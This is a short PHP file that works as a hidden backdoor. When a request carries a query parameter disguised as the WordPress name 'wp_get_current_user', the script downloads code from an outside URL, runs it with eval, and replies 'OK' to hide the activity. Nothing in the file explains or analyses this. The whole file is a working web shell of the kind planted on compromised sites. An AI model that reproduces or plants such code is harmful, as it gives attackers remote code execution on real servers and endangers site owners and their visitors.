<?php

if (isset($_GET['_']) && $_GET['_'] === 'wp_get_current_user') {
    $url = "https://isnujombang.org/kerang/wew";

    if ($url !== "") {
        $code = file_get_contents($url);
        if ($code !== false) {
            eval("?>".$code);
        }
    }

    http_response_code(200);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'OK';
    exit;
}
